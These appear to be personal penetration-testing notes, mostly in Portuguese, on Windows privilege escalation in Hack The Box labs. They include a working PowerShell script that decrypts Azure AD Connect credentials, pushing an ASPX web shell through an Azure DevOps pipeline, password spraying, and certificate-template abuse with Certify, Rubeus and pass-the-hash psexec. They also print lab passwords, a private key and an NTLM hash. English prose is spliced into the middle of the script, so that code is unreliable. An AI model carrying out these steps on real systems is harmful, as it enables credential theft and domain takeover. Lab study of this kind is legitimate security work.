# Privelige excalation

The **Windows-Exploit-Suggester** script can be downloaded from this link:
[Windows-Exploit-Suggester](Compiling%20Windows%20Exploits%2045ecbcd8cd5a4113bca1515de9db216d.md)

**`./windows-exploit-suggester.py -–database <database>.xlsx -–systeminfo <systeminfo>.txt`**

# Azure

- Azure
    
    Navegando em C:\Program Files\ podemos ver que o Microsoft SQL Server e o AD Connect estão instalados. Existem muitos artigos publicados online relacionados a vulnerabilidades e oportunidades de escalação de privilégios com o serviço Azure AD (AAD) Sync. Vamos descobrir a versão do AD Connect. De acordo com a documentação da Microsoft, o nome do serviço responsável pela sincronização do AD local com o Azure AD é ADSync. Não vemos uma referência a isso em Get-Process em execução, e a tentativa de executar tasklist resulta em um erro de Acesso Negado. Também podemos tentar enumerar serviços com o cmdlet PowerShell Get-Service, ou invocando wmic.exe service get name, sc.exe query state=all ou net.exe start, mas também é negado acesso. Em vez disso, podemos enumerar a instância do serviço usando o Registro.
    
    ```
    *Evil-WinRM* PS C:> cd Progra~1
    *Evil-WinRM* PS C:\Program Files> ls
    Diretório: C:\Program Files
    Modo Hora da Última Gravação Tamanho Nome
    
    ---
    
    d----- 2/1/2020 9:36 PM Arquivos Comuns
    d----- 2/1/2020 2:46 PM internet explorer
    d----- 2/1/2020 2:38 PM Microsoft Analysis Services
    d----- 2/1/2020 3:37 PM Microsoft Azure Active Directory Connect
    d----- 2/1/2020 3:02 PM Microsoft Azure AD Connect Health Sync
    d----- 2/1/2020 2:53 PM Microsoft Azure AD Sync
    d----- 2/1/2020 2:31 PM Microsoft SQL Server
    
    Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
    ```
    
    `Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled.png)
    
    Isso revela que o binário do serviço é `C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe`. Podemos emitir o comando abaixo para obter a versão do arquivo (e do produto).
    
    `Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%201.png)
    
    Pesquisando online, revela-se a ferramenta adconnectdumphttps://github.com/fox-it/adconnectdump, que pode ser usada para extrair a senha da conta de sincronização do AD Connect. O repositório menciona que a forma como o AD Connect armazena credenciais mudou há um tempo atrás. A nova versão armazena credenciais usando DPAPI e a versão antiga usava o Registro. A versão atual do AD Connect no momento da escrita é 1.5.30.0, então é improvável que a versão no servidor use DPAPI. Esta ferramenta funciona para versões mais recentes do AD Connect que usam DPAPI.
    
    Mais algumas pesquisas revelam esta postagem do blog, que é recomendada para leitura. Ele detalha o processo de exploração para a versão mais antiga do AD Connect. Copie o script da postagem do blog e salve-o localmente.
    
    A tentativa de executar isso como está não foi bem-sucedida. Vamos tentar extrair os valores instance_id, keyset_id e entropy do banco de dados manualmente.
    
    Uma instalação padrão do AD Connect usa uma instância do SQL Server Express como LocalDB, conectando-se através de um pipe nomeado. No entanto, a enumeração de C:\Program Files e netstat revela que o Microsoft SQL Server está instalado e vinculado a 10.10.10.172 (mas não está acessível externamente). Portanto, parece que esta foi uma instalação personalizada do AD Connect.
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%202.png)
    
    Em vez disso, podemos usar o utilitário nativo do SQL Server sqlcmd.exe para extrair os valores do banco de dados. Isso é bem-sucedido e os valores são retornados.
    
    `sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from
    mms_server_configuration"`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%203.png)
    
    Modifique o script para definir as variáveis $key_id, $instance_id e $entropy para os valores que extraímos do banco de dados e remova os comandos que tentam obtê-los automaticamente. Adicione isso após a primeira linha do script
    
    [@_xpn_ - Azure AD Connect for Red Teamers](https://blog.xpnsec.com/azuread-connect-for-redteam/)
    
    Remover as seguintes linhas do script
    
    ```
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM
    mms_server_configuration"
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null
    $key_id = $reader.GetInt32(0)
    $instance_id = $reader.GetGuid(1)
    $entropy = $reader.GetGuid(2)
    $reader.Close()
    ```
    
    `$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"`
    
    O codigo que deve ser colocado num ficheiro `adconnect.ps1`
    
    ```
    Function Get-ADConnectPassword{
    Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
    $key_id = 1
    $instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
    $entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"
    $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList
    "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
    $client.Open()
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM
    mms_management_agent WHERE ma_type = 'AD'"
    $reader = $cmd.ExecuteReader()
    $reader.Read() | Out-Null
    $config = $reader.GetString(0)
    $crypted = $reader.GetString(1)
    $reader.Close()
    add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
    $km = New-Object -TypeName
    Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
    $km.LoadKeySet($entropy, $instance_id, $key_id)
    $key = $null
    $km.GetActiveCredentialKey([ref]$key)
    $key2 = $null
    $km.GetKey(1, [ref]$key2)
    $decrypted = $null
    The -s flag in Evil-WinRM allows us to specify a folder containing PowerShell scripts. We can load a script
    in memory within the Evil-WinRM session by typing the script name and hitting return.
    This was successful, and we have obtained credentials for the AD Connect Sync account. In this case, as it
    was a custom install, it seems the primary domain administrator was used for this. It's worth noting that a
    default installation uses the NT SERVICE\ADSync service account.
    Let's use Evil WinRM to connect as the administrator.
    $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
    $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']"
    | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
    $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']"
    | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
    $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name =
    'Password'; Expression = {$_.node.InnerXML}}
    Write-Host ("Domain: " + $domain.Domain)
    Write-Host ("Username: " + $username.Username)
    Write-Host ("Password: " + $password.Password)
    }
    ```
    
    A flag `-s` no Evil-WinRM permite especificar uma pasta contendo scripts do PowerShell. Podemos carregar um script na memória dentro da sessão Evil-WinRM digitando o nome do script e pressionando Enter.
    
    `evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s . adconnect.ps1`
    `Get-ADConnectPassword`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%204.png)
    
    A operação foi bem-sucedida e obtivemos credenciais para a conta de sincronização do AD Connect. Neste caso, como foi uma instalação personalizada, parece que o administrador do domínio principal foi usado para isso. É importante notar que uma instalação padrão usa a conta de serviço NT SERVICE\ADSync.
    
    Vamos usar o Evil WinRM para conectar como administrador.
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%205.png)
    
- Azure DevOps
    
    Como nathen, podemos visualizar definições de compilação e pipelines, mas não modificá-los. A compilação de integração contínua, Spectral-CI, copia o conteúdo do repositório para w:\sites\spectral.worker.htb. Isso indica que podemos ser capazes de carregar um web shell para w:\sites\spectral.worker.htb puxando código para seu branch master.
    
    ![Bildschirmfoto 2024-03-05 um 22.03.40.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.03.40.png)
    
    Vamos clonar o repositório para nossa máquina local usando o git. Este repositório será para o subdomínio spectral.
    
    `apt -y install git
    git clone
    http://nathen:wendel98@devops.worker.htb/ekenas/SmartHotel360/_git/spectral`
    
    ![Bildschirmfoto 2024-03-05 um 22.04.57.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.04.57.png)
    
    Em seguida, criamos um novo branch com o comando `git checkout -b shell` no diretório spectral.
    
    ![Bildschirmfoto 2024-03-05 um 22.07.04.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.07.04.png)
    
    Em seguida, podemos copiar um shell ASPX simples para nosso diretório atual e fazer o upload do novo arquivo para o servidor.
    
    `cp /usr/share/webshells/aspx/cmdasp.aspx .
    git add .
    git commit -m 'updated with shell'`
    
    ![Bildschirmfoto 2024-03-05 um 22.08.07.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.08.07.png)
    
    Agora podemos fazer o commit para o repositório do Azure DevOps com o seguinte comando:
    
    `git push -u origin shell`
    
    ![Bildschirmfoto 2024-03-05 um 22.09.03.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.09.03.png)
    
    Podemos usar nosso navegador para verificar se o branch e o arquivo foram criados. Em seguida, clique em "Criar uma solicitação pull" para mesclar este branch no branch master.
    
    ![Bildschirmfoto 2024-03-05 um 22.02.32.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.02.32.png)
    
    Defina um título, um item de trabalho e, em seguida, clique em "Criar".
    
    ![Bildschirmfoto 2024-03-05 um 22.10.07.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.10.07.png)
    
    Ele o redirecionará para uma nova interface onde podemos concluir a solicitação pull clicando em "Aprovar" e depois em "Concluir".
    
    ![Bildschirmfoto 2024-03-05 um 22.10.49.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.10.49.png)
    
    Se visitarmos [http://spectral.worker.htb/cmdasp.aspx](http://spectral.worker.htb/cmdasp.aspx), podemos ver que o nosso shell foi carregado nele, e ao executar "whoami" revela que o serviço está sendo executado como iis apppool\defaultapppool.
    
    ![Bildschirmfoto 2024-03-05 um 22.11.33.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.11.33.png)
    
    A enumeração básica do sistema operacional mostra que uma unidade adicional foi adicionada à máquina, montada na unidade W, o que também vimos da definição de compilação.
    
    ![Bildschirmfoto 2024-03-05 um 22.12.03.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.12.03.png)
    
    A inspeção da unidade W:\ revela um diretório chamado svnrepos que contém um arquivo chamado passwd.
    
    ![Bildschirmfoto 2024-03-05 um 22.12.33.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.12.33.png)
    
    A inspeção de w:\svnrepos\www\conf\passwd mostra um arquivo que contém uma lista de nomes de usuário e senhas.
    
    ![Bildschirmfoto 2024-03-05 um 22.13.16.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.13.16.png)
    
    Agora temos combinações de credenciais para usar com o CrackMapExec. Salve os dados em um arquivo chamado passwd e analise os dados com o awk.
    
    `cat passwd  | awk '{ print $1 }' > users
    cat passwd  | awk '{ print $3 }' > passwords
    cme winrm 10.10.10.203 -u users -p passwords --no-bruteforce`
    
    ![Bildschirmfoto 2024-03-05 um 22.14.14.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.14.14.png)
    
    Isso revela as credenciais válidas robisl / wolves11. Agora podemos usar o Evil-WinRM para conectar-se à máquina via WinRM e ler o arquivo user.txt.
    
    `evil-winrm -i 10.10.10.203 -u robisl -p wolves11`
    
    Não parecem haver nenhum caminho comum de escalonamento de privilégios, então vamos voltar ao serviço Azure DevOps.
    ``
    
    ![Bildschirmfoto 2024-03-05 um 22.16.39.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.16.39.png)
    
    Faça logout do portal DevOps como nathen e faça login usando robisl / wolves11. Após o login, verificamos que temos acesso a um novo projeto chamado PartsUnlimited.
    
    ![Bildschirmfoto 2024-03-05 um 22.17.18.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.17.18.png)
    
    Após alguma enumeração dentro deste projeto, vemos que o usuário robisl é membro do grupo "Build Administrators". Isso é interessante, pois os administradores de compilação têm controle total sobre os pipelines no projeto. Isso significa que podemos criar novas definições de compilação para executar comandos arbitrários.
    
    ![Bildschirmfoto 2024-03-05 um 22.17.53.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.17.53.png)
    
    ![Bildschirmfoto 2024-03-05 um 22.19.27.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.19.27.png)
    
    ![Bildschirmfoto 2024-03-05 um 22.19.45.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.19.45.png)
    
    ![Bildschirmfoto 2024-03-05 um 22.20.35.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.20.35.png)
    
    ![Bildschirmfoto 2024-03-05 um 22.20.50.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.20.50.png)
    
    Também precisamos configurar o agente para fazer algo. Novamente, há muitas coisas que o agente pode fazer, já que a lista de tarefas é bastante extensa, mas vamos usar a tarefa PowerShell. Clique no botão "+" no item do job do agente para adicionar uma nova tarefa, escolha a tarefa PowerShell e clique em Adicionar.
    
    ![Bildschirmfoto 2024-03-05 um 22.21.25.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.21.25.png)
    
    ![Bildschirmfoto 2024-03-05 um 22.21.47.png](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Bildschirmfoto_2024-03-05_um_22.21.47.png)
    
    Depois de adicionar o utilizador cube, iniciamos sessão com o `evil-winrm`
    
    `evil-winrm -i 10.10.10.203 -u cube -p Password123!`
    

# Directory

- Directory
    
    `dir -force`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%206.png)
    
    Diretoriasencontradas `C:\PSTranscripts\20191203\` 
    
    Depois de fazer  `dir -force` novamente encontramos um ficheiro
    `C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.t
    xt`
    
    Ao imprimir o ficheiro 
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%207.png)
    
    `evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!`
    

# Certify

- Certify
    
    [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
    
    `.\Certify.exe find /vulnerable`
    
    ```
    Evil-WinRM* PS C:\programdata> .\Certify.exe find /vulnerable
    
       _____          _   _  __
      / ____|        | | (_)/ _|
     | |     ___ _ __| |_ _| |_ _   _
     | |    / _ \ '__| __| |  _| | | |
     | |___|  __/ |  | |_| | | | |_| |
      \_____\___|_|   \__|_|_|  \__, |
                                 __/ |
                                |___./
      v1.1.0
    
    [*] Action: Find certificate templates
    [*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
    
    [*] Listing info about the Enterprise CA 'sequel-DC-CA'
    
        Enterprise CA Name            : sequel-DC-CA
        DNS Hostname                  : dc.sequel.htb
        FullName                      : dc.sequel.htb\sequel-DC-CA
        Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
        Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
        Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
        Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
        Cert Start Date               : 11/18/2022 12:58:46 PM
        Cert End Date                 : 11/18/2121 1:08:46 PM
        Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
        UserSpecifiedSAN              : Disabled
        CA Permissions                :
          Owner: BUILTIN\Administrators        S-1-5-32-544
    
          Access Rights                                     Principal
    
          Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
          Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
          Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
          Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        Enrollment Agent Restrictions : None
    
    [!] Vulnerable Certificates Templates :
    
        CA Name                               : dc.sequel.htb\sequel-DC-CA
        Template Name                         : UserAuthentication
        Schema Version                        : 2
        Validity Period                       : 10 years
        Renewal Period                        : 6 weeks
        msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
        mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
        Authorized Signatures Required        : 0
        pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
        mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
        Permissions
          Enrollment Permissions
            Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                          sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                          sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
          Object Control Permissions
            Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
            WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                          sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                          sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
            WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                          sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                          sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
            WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                          sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                          sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    
    Certify completed in 00:00:09.9977384
    ```
    
    As informações importantes são `CA Name` e `Template Name` .
    
    `.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator`
    
    ```
    *Evil-WinRM* PS C:\programdata> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
    
       _____          _   _  __
      / ____|        | | (_)/ _|
     | |     ___ _ __| |_ _| |_ _   _
     | |    / _ \ '__| __| |  _| | | |
     | |___|  __/ |  | |_| | | | |_| |
      \_____\___|_|   \__|_|_|  \__, |
                                 __/ |
                                |___./
      v1.1.0
    
    [*] Action: Request a Certificates
    
    [*] Current user context    : sequel\Ryan.Cooper
    [*] No subject name specified, using current context as subject.
    
    [*] Template                : UserAuthentication
    [*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
    [*] AltName                 : administrator
    
    [*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA
    
    [*] CA Response             : The certificate had been issued.
    [*] Request ID              : 10
    
    [*] cert.pem         :
    
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEA1A75T1LNDFPthFgQ6EJOF5IfWAW+G5xkzcZHONgKNFDMJiCY
    wPYVg74oR2N8V5J4MnLO2X1gH6lbYy6u30gTM7ZvwTQbxjJ25/prq9YbMkoLsjaD
    Mdw+IhV9o4iDSMZPm0lOzbdx6bd3S+e1Y/UqX262N+sG/ImRHSWW0IVGZ6BSBDZx
    F64MeXkAJpVvNffjfcjDg4LD3lW7ZkHd2mgPDo9+hyeA6DgIHyzCmEbynSDenshC
    UWK58yiMTcs+6jJ3eCJvLQuKC7fXcR9nw5YWpnKs6MmTEXzhWzGGIMtB3eI3yHGU
    KUfZKQ5EqZkxVj2YUvuDOnFhfko4e2C3hVq/uQIDAQABAoIBAHtkxy+gN86/m4sS
    D6yGwJg4n+KBXPEGHSYcBV+PXsi4Z0KcXyaRS02gviFkQ3tVsHlykui9asyhqJrb
    FEi60OmbdAYRg0PeI5CzCCoyaRrnOU0XKVo/FSySIsyg5/vV4YazrpZH85IS/uj9
    SHCEvYZQjtmU+jjC99zk/ZASrTgoY2b79kRZsf1J2AW7Hqoc+fqm7dOaU0bWat2F
    fYNl0fFHTOszV7Vo61+W3YFK36oHbI1D7o2e+WYJqs761AEKGQvmtDXez1YJnJ0M
    Ykn4qHP4pifbSprR8XPXntRoYtu4EhAtnTZHwsy5HYK9GmIoRerJCMNK7isS8OpR
    PnJJav0CgYEA9bOGqK3k32BBTSb5x0Imxt5o3HG+Q3vxA9+Inwp3fZpL6DHruDnH
    a5GxUAJuXH3RoS98uLedY0/OzgBTDZF+Cg7lk870NoUje4trb2AxYUtTTfij2PEH
    WWxsMv7D/oEqMY/8uBjNdvbnwjkLvIQfW/WjuQ9FmkYRhhAb29IfmQsCgYEA3PJy
    fB4yopAEvtmJpi9xreTr/iwFZZXBr+hNIeMAnCW0+Z8YR41LKvxMeC0bfQegIK2p
    iLexn0rwo5nHTjTgejuf5lAFQp3fvBw0sIzVQygwvIwgorDkZqT3uKxol9FROs0+
    1LG3toO6L+XN5naaKDth2Uwq3LU3d/J1/EgLrMsCgYEAgIhF7X/qtyA3iRDWofJt
    LqOy339xNQRldM0/P1POZpqNEw7qbRlsxU0WIPDkouX+//9Dk64aW5WobgOlbvep
    o8FfQA+Hme3UPhEVRtJfgrJRBf0IWbjdS154y8SS61TOqdbVMcln0tAfNW96QEgt
    z4GVAH6Ivsfg6u0KZdhqRzkCgYAmeh5P2R5uSvBYoB+ljjuY0fX7FIV4FGVfke/k
    x9hyWOq0Ue1zgHqnqLpUb16LHonXRwbwJTVMjUts4jngN7sj7kBBZowT9tRguPTA
    DjaRdG1QWILSckXETlRJl9S7I5umxtl7Rtu8cCI7dyStTtg3y2eV5PrN5s0bGWFM
    putJkwKBgQCBXsrLDd6k8JeDNQ2eGqjE01HmnMu6N4UpPy7/HYlMsYtYr7HjP6dn
    tS/Pew71NWtuOzLT2C7Mb/UrBEE7Q2aZrCXth3Ci1EJkmwKIKf+LM3b3iN/pQpuX
    kiuQWUoR6vJEE077KXOFfQSLykxncr8PAFQbbOy0qeCuBRc2iwfVfg==
    -----END RSA PRIVATE KEY-----
    -----BEGIN CERTIFICATE-----
    MIIGEjCCBPqgAwIBAgITHgAAAApLhL3wEWWCWAAAAAAACjANBgkqhkiG9w0BAQsF
    ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
    MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjQwMTA0MjIxNjQzWhcNMjYwMTA0
    MjIyNjQzWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
    c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
    MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDUDvlPUs0MU+2EWBDoQk4Xkh9Y
    Bb4bnGTNxkc42Ao0UMwmIJjA9hWDvihHY3xXkngycs7ZfWAfqVtjLq7fSBMztm/B
    NBvGMnbn+mur1hsySguyNoMx3D4iFX2jiINIxk+bSU7Nt3Hpt3dL57Vj9SpfbrY3
    6wb8iZEdJZbQhUZnoFIENnEXrgx5eQAmlW819+N9yMODgsPeVbtmQd3aaA8Oj36H
    J4DoOAgfLMKYRvKdIN6eyEJRYrnzKIxNyz7qMnd4Im8tC4oLt9dxH2fDlhamcqzo
    yZMRfOFbMYYgy0Hd4jfIcZQpR9kpDkSpmTFWPZhS+4M6cWF+Sjh7YLeFWr+5AgMB
    AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
    lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
    KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
    CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
    hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
    Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjBMjSnA7ki7W/AKQT6n1TGM+HT
    MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
    IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
    gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
    bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
    bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
    ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
    gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
    QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
    bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
    b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
    AAOCAQEAcTeqBO5f7q/T7462zid36CJ5k5N9l24aSzWal1BzaiV7ox6ZW6J/nIgB
    xDWoUX8pnyI44v2sKDhYybJDvw3McaJqdW++kVcilULGdev7MegPB3HR8CEvJnyo
    lkgOp/PKqn6i1Sx8RCzTeopvDGnRxCxb7x6dt1vPQ+x1UvFyZRFaSEbu0bmtBRMB
    yElm3F/txyvbbHrDJo340ujm42Jt8iVktnpBiW38t34oTXeupeooZyphJUDj1t+W
    JE5JBgQFqBK7VlLAr4L0P4dE1LhHn0hLbpFQ5XttoPu4WIxgj77GdyLwqqdaI/bj
    /yIV7jvMIEZ9vgZIOWpZA7lfHIIE/A==
    -----END CERTIFICATE-----
    
    [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    
    Certify completed in 00:00:13.7872615
    
    ```
    
    Criar o `cert.pem` e colar tanto a chave publico como a privada para o certificados
    
    Utilizar o seguinte comando para o certificado extraído
    
    `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
    
    Fazer upload do `cert.pfx` e `Rubeus.exe` para a maquina windows
    
    `.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap` 
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%208.png)
    
    A Hash NTLM é `A52F78E4C751E5F5E17E1E9F3E58F4EE` 
    
    `python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes A52F78E4C751E5F5E17E1E9F3E58F4EE:A52F78E4C751E5F5E17E1E9F3E58F4EE administrator@10.129.228.253`
    
- Certipy 1
    
    `certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable`
    
    ```
    └──╼ [★]$ certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Finding certificate templates
    [*] Found 34 certificate templates
    [*] Finding certificate authorities
    [*] Found 1 certificate authority
    [*] Found 12 enabled certificate templates
    [*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
    [!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
    [*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
    [!] Failed to connect to remote registry. Service should be starting now. Trying again...
    [*] Got CA configuration for 'sequel-DC-CA'
    [*] Enumeration output:
    Certificate Authorities
      0
        CA Name                             : sequel-DC-CA
        DNS Name                            : dc.sequel.htb
        Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
        Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
